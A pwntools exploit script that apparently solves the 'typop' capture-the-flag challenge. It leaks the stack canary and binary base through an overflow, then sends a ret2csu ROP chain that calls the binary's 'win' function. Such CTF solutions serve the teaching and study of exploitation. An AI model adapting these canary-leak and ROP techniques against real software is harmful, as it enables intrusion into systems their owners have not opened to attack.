#!/usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
s = lambda p,a: p.send(a)
up = lambda b: int.from_bytes(b, byteorder="little")

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("typop.chal.idek.team", 1337)
    else:
        return process(binary)

def leak_base(p,e,canary):
    pad = b"A" * 10
    # Get base address of the binary
    log.info("Leaking binary base")
    #pause()
    p.sendline(b"y")
    p.sendline(b"y"*25)
    p.recvuntil(b"y\n")

    leak = u64(p.recv(6).ljust(8,b"\x00"))
    e.address = leak - 0x1447
    log.info(f"Leaked pointer {hex(leak)}\nResolved base address: {hex(e.address)}")

    pad = p64(e.sym["win"]) + b"\x00" * 2

    p.sendline(pad + canary)


def leak_canary(p):
    log.info("Leaking canary")
    pad = b"A" * 10

    #pause()
    p.sendline(b"y")
    p.sendline(pad)
    p.recvuntil(b"You said:")
    p.recvline()

    canary = p.recv(7).rjust(8,b"\x00")
    log.info(f"Received Canary Leak: {canary}")
    
    stack_leak = u64(p.recv(6).ljust(8,b"\x00"))
    log.info(f"Stack Leak {hex(stack_leak)}")

    p.sendline(pad+canary)

    return canary,stack_leak

def exploit(p,e,canary,stack):

    pad = p64(e.sym['win']) + b"A" * 2
    p.sendline(b"y")
    p.sendline(b"y")

    csu_gadget1 = e.address + 0x14ca
    csu_gadget2 = e.address + 0x14b0

    call = stack - 0x18

    chain = canary + p64(e.sym["win"])
    chain += p64(csu_gadget1) + p64(1) + p64(0) 
    chain += p64(ord("f")) + p64(ord("l")) + p64(ord("a")) + p64(call)
    chain += p64(csu_gadget2)

    log.info(f"CSU Gadget 1: {hex(csu_gadget1)}")
    log.info(f"CSU Gadget 2: {hex(csu_gadget2)}")
    log.info(f"Win: {hex(e.sym['win'])}")
    log.info(f"ret2csu exploit chain {chain}, len {hex(len(chain))}")

    p.sendline(pad + chain)
    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    canary, stack = leak_canary(p)
    leak_base(p,e,canary)
    exploit(p,e,canary,stack)
